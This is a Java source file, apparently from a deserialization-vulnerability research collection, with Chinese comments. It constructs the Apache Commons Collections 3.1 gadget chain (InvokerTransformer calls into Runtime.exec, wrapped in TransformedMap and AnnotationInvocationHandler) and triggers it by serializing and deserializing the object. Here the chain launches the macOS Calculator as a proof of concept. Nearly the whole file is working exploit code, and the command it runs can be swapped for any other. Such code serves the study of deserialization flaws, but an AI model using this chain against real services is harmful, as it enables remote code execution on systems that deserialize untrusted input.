package com.threedr3am.bug.collections.v3.no1;


import com.threedr3am.bug.common.utils.SerializeUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

/**
 * Map反序列化漏洞，该洞利用的是Collections3.1中的TransformedMap，TransformedMap可以封装一个Map，并且实现一个Transformer链，
 * 在Map的value在变化时执行Transformer进行转换，而Transformer包含的是Runtime.exec执行指令。
 * 利用AnnotationInvocationHandler重写的readObject方法成功实现反序列化直接触发，而不需要等待修改value。
 *
 * Created by threedr3am on 2018/5/3.
 */
public class SerializeMapForTransformer
{
    public static void main( String[] args ) throws Exception {
        //create命令链
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"/Applications/Calculator.app/Contents/MacOS/Calculator"}),
        };
        Transformer transformer = new ChainedTransformer(transformers);

        //利用AnnotationInvocationHandler反序列化，直接触发Transformer
        testAnnotationInvocationHandlerMap(transformer);

        //测试TransformerMap在map的key、value改变中触发
//        testMap(transformer);


    }

    /**
     * 测试AnnotationInvocationHandler反序列化中，直接触发Transformer
     *
     */
    private static void testAnnotationInvocationHandlerMap(Transformer transformer) throws Exception{
        //转化map
        Map innerMap = new HashMap();
        innerMap.put("value","2");
        Map ouputMap = TransformedMap.decorate(innerMap,null,transformer);
        //jdk1.8该类的方法readObject()是使用了native方法安全更新map，无法再触发
        Constructor<?> ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
        ctor.setAccessible(true);
        InvocationHandler o = (InvocationHandler) ctor.newInstance(Target.class,ouputMap);
        //序列化输出
        byte[] bytes = SerializeUtil.serialize(o);
        //反序列化
        SerializeUtil.deserialize(bytes);
    }

    /**
     * 测试TransformerMap在包装的map中，key、value改变触发Transformer
     *
     */
    private static void testMap(Transformer transformer) throws Exception{
        //转化map
        Map ouputMap = TransformedMap.decorate(new HashMap<>(),null,transformer);
        //序列化输出
        byte[] bytes = SerializeUtil.serialize(ouputMap);
        //反序列化
        Map innerMap = SerializeUtil.deserialize(bytes);
        //put操作触发，命令链
        innerMap.put("2","orange");
    }

}
